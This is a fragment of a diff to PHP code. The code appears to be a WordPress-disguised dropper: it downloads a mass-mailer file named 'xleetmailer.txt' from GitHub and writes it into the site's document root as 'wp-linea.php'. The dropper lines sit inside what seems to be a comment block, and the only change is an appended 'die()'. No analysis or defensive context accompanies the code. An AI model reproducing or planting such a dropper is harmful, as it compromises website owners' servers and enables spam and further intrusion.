@@ -20,7 +20,7 @@ if (file_put_contents ($wpoptionss31, $sec31));
 
 $wpoptionssssr = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/xleetmailer.txt');
 $wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/cgi-et/wp-linea.php"; 
-if (file_put_contents ($wpoptionsssss, $wpoptionssssr)); */  }
+if (file_put_contents ($wpoptionsssss, $wpoptionssssr)); */  die() }
 
 
 
